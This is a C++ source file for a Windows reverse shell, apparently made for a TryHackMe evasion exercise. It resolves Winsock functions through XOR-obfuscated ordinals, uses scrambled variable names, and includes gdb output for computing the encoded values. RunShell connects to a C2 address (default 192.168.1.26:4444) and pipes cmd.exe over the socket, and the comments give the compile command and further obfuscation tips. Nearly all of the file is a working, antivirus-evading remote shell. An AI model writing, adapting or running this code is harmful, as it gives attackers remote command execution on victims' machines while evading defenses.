#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <winuser.h>
#define DEFAULT_BUFLEN 1024
#define XORKEY 99
// For now this works, but you can also change the names of the types, and make sure that each typecast and declared type is also changed
// You also might want to obfuscate the GetProcAddress(handle, string) to a code-split-merge method by array
// Also the THM challenge is wrong, it compiles in C++ not C.
//x86_64-w64-mingw32-g++ -lwsock32 -lws2_32 revshell.cpp
/*
 * Type "apropos word" to search for commands related to "word".
(gdb) p/x 0x1073^99
$1 = 0x1010
(gdb) p/x 0x1078^99
$2 = 0x101b
(gdb) p/x 0x100b^99
$3 = 0x1068
(gdb) p/x 0x1009^99
$4 = 0x106a
(gdb) p/x 0x102f^99
$5 = 0x104c
(gdb) p/x 0x1003^99
$6 = 0x1060
(gdb) p/x 0x1074^99
$7 = 0x1017
(gdb)

 * */
int deobfuscate(int x) {
    x ^= XORKEY;
    for (int i = 0; i < 4096; i++) {
        x -= 0x1;
    }
//    cout << x << endl;
    return x;
}

typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int(WSAAPI* WSACLEANUP)(void);
HMODULE dcffaf = LoadLibraryW(L"ws2_32");
// ordinal 0x73
//WSASTARTUP putratSASWym = (WSASTARTUP) GetProcAddress(dcffaf, "WSAStartup");
WSASTARTUP putratSASWym = (WSASTARTUP) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1010)));
// ordinal 0x78
//WSASOCKETA AtekcoSASWym = (WSASOCKETA) GetProcAddress(dcffaf, "WSASocketA");
//WSASOCKETA AtekcoSASWym = (WSASOCKETA) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x78));
WSASOCKETA AtekcoSASWym = (WSASOCKETA) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x101b)));

// ordinal 0xb
//INET_ADDR rdda_teniym = (INET_ADDR) GetProcAddress(dcffaf, "inet_addr");
//INET_ADDR rdda_teniym = (INET_ADDR) GetProcAddress(dcffaf, MAKEINTRESOURCE(0xb));
INET_ADDR rdda_teniym = (INET_ADDR) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1068)));

// ordinal 0x9
//HTONS snothym = (HTONS) GetProcAddress(dcffaf, "htons");
//HTONS snothym = (HTONS) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x9));
HTONS snothym = (HTONS) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x106a)));

// ordinal 0x2f
//WSACONNECT tcennoCASWym = (WSACONNECT) GetProcAddress(dcffaf, "WSAConnect");
//WSACONNECT tcennoCASWym = (WSACONNECT) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x2f));
WSACONNECT tcennoCASWym = (WSACONNECT) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x104c)));

// ordinal 0x3
//CLOSESOCKET tekcosesolcym = (CLOSESOCKET) GetProcAddress(dcffaf, "closesocket");
//CLOSESOCKET tekcosesolcym = (CLOSESOCKET) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x3));
CLOSESOCKET tekcosesolcym = (CLOSESOCKET) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1060)));

// ordinal 0x74
//WSACLEANUP punaelCASWym = (WSACLEANUP) GetProcAddress(dcffaf, "WSACleanup");
//WSACLEANUP punaelCASWym = (WSACLEANUP) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x74));
WSACLEANUP punaelCASWym = (WSACLEANUP) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1017)));


void RunShell(char* C2Server, int C2Port) {
        SOCKET tekcoSym;
        struct sockaddr_in addr;
        WSADATA version;
        putratSASWym(MAKEWORD(2,2), &version);
        tekcoSym = AtekcoSASWym(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = rdda_teniym(C2Server);
        addr.sin_port = snothym(C2Port);

        if (tcennoCASWym(tekcoSym, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            tekcosesolcym(tekcoSym);
            punaelCASWym();
        } else {
            printf("Connected to %s:%d\\n", C2Server, C2Port);

            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tekcoSym;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "192.168.1.26";
        int port = 4444;
        RunShell(host, port);
    }
    return 0;
} 
